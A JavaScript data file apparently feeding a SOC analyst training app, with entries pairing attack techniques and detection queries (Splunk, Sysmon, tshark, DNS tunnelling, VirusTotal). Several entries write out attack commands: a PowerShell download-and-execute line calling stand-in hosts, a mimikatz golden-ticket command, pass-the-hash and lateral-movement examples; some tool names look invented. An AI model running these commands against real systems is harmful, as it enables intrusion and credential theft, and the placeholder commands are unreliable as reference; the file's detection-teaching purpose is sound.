{ id: 26, moduleId: 1, concept: "PowerShell Attack – Download and Execute", explanation: "DownloadString + Invoke-Expression pattern.", whyItMatters: "Directly fetches payloads.", command: "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious')\"", syntax: "powershell -Command <script>", example: "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://bad')\"", cmdExplanation: "Downloads and runs remote script.", socUse: "Alert on IEX usage.", remember: "Combine with network logs to see outbound connections.", noteVisual: "powershell_attack_diagram.png" },
{ id: 27, moduleId: 1, concept: "PowerShell Attack – Lateral Movement", explanation: "Use of Invoke-Command or Enter-PSSession across hosts.", whyItMatters: "Spreads compromise.", command: "Invoke-Command -ComputerName <target> -ScriptBlock { ... }", syntax: "Invoke-Command -ComputerName <host> -ScriptBlock { <script> }", example: "Invoke-Command -ComputerName 10.0.0.5 -ScriptBlock { Get-Process }", cmdExplanation: "Runs script on remote host.", socUse: "Detect remote PowerShell sessions.", remember: "Log PowerShell transcription logs.", noteVisual: "powershell_attack_diagram.png" },
// 4️⃣ Sysmon Event Map (2 pages)
{ id: 28, moduleId: 1, concept: "Sysmon Event ID Mapping – Overview", explanation: "Sysmon provides detailed process and network activity logs.", whyItMatters: "Rich data for threat hunting.", command: "Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational", syntax: "Get-WinEvent -LogName <log>", example: "Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational | where Id==1", cmdExplanation: "Fetches Sysmon events.", socUse: "Correlate with process trees.", remember: "Enable Sysmon with appropriate config.", noteVisual: "sysmon_event_map.png" },
{ id: 29, moduleId: 1, concept: "Sysmon Advanced Correlation", explanation: "Combine Event ID 1 (process creation) with ID 3 (network connections).", whyItMatters: "Detect C2 via process‑network link.", command: "# Example PowerShell query", syntax: "# Not a CLI", example: "# Pseudo code to join events", cmdExplanation: "Shows concept.", socUse: "Build detection rules.", remember: "Map child processes.", noteVisual: "sysmon_event_map.png" },
// 5️⃣ DNS Tunneling (2 pages)
{ id: 30, moduleId: 2, concept: "DNS Tunneling – Overview", explanation: "Data exfiltration via DNS queries with encoded payloads.", whyItMatters: "DNS is often allowed outbound.", command: "jq -r '.queries[] | select(.name | length>60) | .name' dns_log.json", syntax: "jq -r <filter> <file>", example: "jq -r '.queries[] | select(.name | length>60) | .name' dns_log.json", cmdExplanation: "Lists suspicious long DNS queries.", socUse: "Identify encoded data in subdomains.", remember: "Combine with entropy analysis.", noteVisual: "dns_tunneling_flowchart.png" },
{ id: 31, moduleId: 2, concept: "DNS Tunneling – Detection Techniques", explanation: "Use length, entropy, and frequency analysis.", whyItMatters: "Early spotting prevents data loss.", command: "python detect_dns_tunnel.py --log dns_log.json", syntax: "python <script> --log <file>", example: "python detect_dns_tunnel.py --log dns_log.json", cmdExplanation: "Runs custom detection.", socUse: "Scheduled daily scans.", remember: "Baseline normal query patterns.", noteVisual: "dns_tunneling_flowchart.png" },
// 6️⃣ Windows Privilege Escalation – Pass‑the‑Hash (3 pages)
{ id: 32, moduleId: 1, concept: "Privilege Escalation – Pass‑the‑Hash Overview", explanation: "Reuse of NTLM hash to authenticate without password.", whyItMatters: "Allows lateral movement.", command: "pth-tool --hash <hash> --target <host>", syntax: "pth-tool --hash <hash> --target <host>", example: "pth-tool --hash a1b2c3... --target 10.0.0.8", cmdExplanation: "Attempts auth using hash.", socUse: "Detect abnormal authentication sources.", remember: "Monitor source IPs for hash usage.", noteVisual: "" },
{ id: 33, moduleId: 1, concept: "Privilege Escalation – Kerberoasting", explanation: "Request service tickets for SPNs and crack them.", whyItMatters: "Extracts service account hashes.", command: "Get-ADComputer -Filter * | foreach { Get-ServiceTicket $_.DistinguishedName }", syntax: "PowerShell AD cmd", example: "Get-ADComputer -Filter * | foreach { Get-ServiceTicket $_.DistinguishedName }", cmdExplanation: "Collects Kerberos tickets.", socUse: "Identify accounts with weak passwords.", remember: "Check for high‑value service accounts.", noteVisual: "" },
{ id: 34, moduleId: 1, concept: "Privilege Escalation – Golden Ticket", explanation: "Forge Kerberos TGT using KRBTGT account hash.", whyItMatters: "Full domain compromise.", command: "mimikatz \"kerberos::golden /user:target /id:500 /rc4:<krbtgt_hash> /ptt\"", syntax: "mimikatz command", example: "mimikatz \"kerberos::golden /user:admin /id:500 /rc4:abcd1234 /ptt\"", cmdExplanation: "Creates golden ticket.", socUse: "Monitor for creation of KRBTGT TGT.", remember: "Monitor for unusual ticket lifetimes.", noteVisual: "" },
// 7️⃣ Network Traffic Analysis – PCAP Basics (sample)
{ id: 35, moduleId: 2, concept: "Wireshark – Opening PCAP Files", explanation: "Load and inspect packet captures.", whyItMatters: "Fundamental for traffic analysis.", command: "wireshark sample.pcap", syntax: "wireshark <file>", example: "wireshark capture.pcap", cmdExplanation: "Opens capture in UI.", socUse: "Baseline normal traffic.", remember: "Apply display filters.", noteVisual: "" },
{ id: 36, moduleId: 2, concept: "tshark – Command‑line PCAP Filtering", explanation: "Extract specific traffic via tshark.", whyItMatters: "Automated extraction for pipelines.", command: "tshark -r capture.pcap -Y \"http.request\" -w http_requests.pcap", syntax: "tshark -r <file> -Y <filter> -w <out>", example: "tshark -r net.pcap -Y \"dns && udp\" -w dns_udp.pcap", cmdExplanation: "Filters DNS over UDP.", socUse: "Feed into IDS.", remember: "Use -T fields for CSV.", noteVisual: "" },
// 8️⃣ SIEM Hands‑On – Splunk (sample)
{ id: 37, moduleId: 3, concept: "Splunk SPL – Basic Search", explanation: "Search logs using SPL.", whyItMatters: "Quick insight into data.", command: "index=security sourcetype=wineventlog EventCode=4624 | stats count by Account_Name", syntax: "SPL query", example: "index=security sourcetype=wineventlog EventCode=4624 | stats count by Account_Name", cmdExplanation: "Counts successful logons per user.", socUse: "Identify anomalous login counts.", remember: "Use timepicker for windows.", noteVisual: "" },
{ id: 38, moduleId: 3, concept: "Splunk SPL – Detect Brute Force", explanation: "Identify multiple failed logons.", whyItMatters: "Early detection of password attacks.", command: "index=security sourcetype=wineventlog EventCode=4625 | bin _time span=5m | stats count by Account_Name, src_ip, _time | where count>10", syntax: "SPL query", example: "...", cmdExplanation: "Counts failures per 5‑minute bucket.", socUse: "Create alert.", remember: "Adjust threshold.", noteVisual: "" },
// 9️⃣ Threat Intelligence – VirusTotal Lookup
{ id: 39, moduleId: 4, concept: "VirusTotal API – URL Reputation", explanation: "Query VT for malicious URL score.", whyItMatters: "Enrich alerts with threat intel.", command: "curl -s \"https://www.virustotal.com/api/v3/urls/<id>\" -H \"x-apikey: $VT_API_KEY\"", syntax: "curl -s <url> -H <header>", example: "curl -s \"https://www.virustotal.com/api/v3/urls/123\" -H \"x-apikey: abc\"", cmdExplanation: "Returns JSON with reputation.", socUse: "Automate enrichment.", remember: "Rate limit 4 req/sec.", noteVisual: "" },
// 10️⃣ Malware Analysis – Static (sample)
{ id: 40, moduleId: 5, concept: "Static PE Header Inspection with objdump", explanation: "Extract PE header fields.", whyItMatters: "Identify packers, entry point.", command: "objdump -x suspicious.exe", syntax: "objdump -x <file>", example: "objdump -x malware.exe", cmdExplanation: "Shows sections, imports.", socUse: "Quick triage.", remember: "Check timestamp.", noteVisual: "" },
// 11️⃣ Email Security – Phishing Triage (sample)
{ id: 41, moduleId: 6, concept: "Phishing Email Triage – Header Analysis", explanation: "Inspect SPF, DKIM, DMARC results.", whyItMatters: "Detect spoofed senders.", command: "# Use mail headers in email client", syntax: "# Not a CLI", example: "# View raw headers", cmdExplanation: "Manual step.", socUse: "Create incident ticket.", remember: "Check X‑Originating‑IP.", noteVisual: "" },
// -----------------------------------------------------------
// End of detailed entries – further topics will be added iteratively.
// -----------------------------------------------------------
];

// Export for app.js consumption
// Expose data as globals for traditional script loading
window.ADVANCED_DOMAIN_MODULES = ADVANCED_DOMAIN_MODULES;
window.ADVANCED_DOMAIN_PAGES = ADVANCED_DOMAIN_PAGES;
